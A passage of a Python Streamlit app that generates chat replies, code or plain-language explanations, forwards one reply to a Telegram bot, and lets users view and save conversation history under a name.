        m.update_data('token', use+1)
        m.save()
        data2 = chat2(title,modded)
        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={data2}")

    if "Code" in genre and st.button('Create Code'):
        with st.spinner('Just a Minute..'):
            data2 =code(createc,level,"None")

    if "Explain" in genre and st.button('Explain in Natural Language'):
        with st.spinner('Just a sec..'):
            data2 =eng(createc,level,"None")
    with st.expander("View Conversation History"):
        option = st.selectbox(
            'Conversation',
            ('view', 'save', 'read'))
        if option =='view':
            lay_chat("namita_c")
        elif option == 'read':
            named = st.text_input("Name:")
            if st.button("View Saved History"):
                lay_chat(named)
        else:
            chatter = list(m.get_data("namita_c"))
            named = st.text_input("Name:")
            if st.button("Save!"):
                try:
                    get = list(m.get_data(named))
                    print(get)
                    m.update_data(named,get + chatter)
                    m.update_data("namita_c",[])
                    m.save()
                    st.write("Saved✅")

                except Exception as e:
                    print(e)
                    m.add_data(named,chatter)
                    m.update_data("namita_c",[])
                    m.save()
                    st.write("Saved")
            # st.subheader(data2)
